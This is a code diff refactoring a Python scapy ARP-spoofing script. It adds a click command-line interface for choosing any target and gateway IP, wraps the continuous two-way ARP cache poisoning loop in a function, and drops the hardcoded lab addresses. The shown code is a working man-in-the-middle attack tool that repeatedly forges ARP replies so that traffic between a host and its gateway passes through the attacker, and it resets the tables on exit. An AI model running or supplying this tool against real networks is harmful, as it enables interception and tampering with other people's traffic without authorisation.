@@ -3,6 +3,35 @@
 import scapy.all as scapy
 import time
 import sys
+import click
+
+
+@click.command()
+@click.option(
+    "-t",
+    "--target",
+    prompt="Input target IP",
+    help="IP address of the target",
+)
+@click.option(
+    "-g",
+    "--gateway",
+    prompt="Input gateway IP",
+    help="Gateway IP",
+)
+def arp_spoof(target, gateway):
+    try:
+        sent_packets_count = 0
+        while True:
+            spoof(target, gateway)
+            spoof(gateway, target)
+            sent_packets_count = sent_packets_count + 2
+            print("\rPackets sent: " + str(sent_packets_count), end="")
+            sys.stdout.flush()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\nExiting... Resetting ARP tables...")
+        restore(target, gateway)
 
 
 def get_mac(ip):
@@ -26,22 +55,15 @@ def spoof(target_ip, spoof_ip):
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = scapy.ARP(
+        op=2,
+        pdst=destination_ip,
+        hwdst=destination_mac,
+        psrc=source_ip,
+        hwsrc=source_mac,
+    )
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "10.0.2.15"
-gateway_ip = "10.0.2.1"
-
-try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\rPackets sent: " + str(sent_packets_count), end="")
-        sys.stdout.flush()
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\nExiting... Resetting ARP tables...")
-    restore(target_ip, gateway_ip)
+if __name__ == "__main__":
+    arp_spoof()
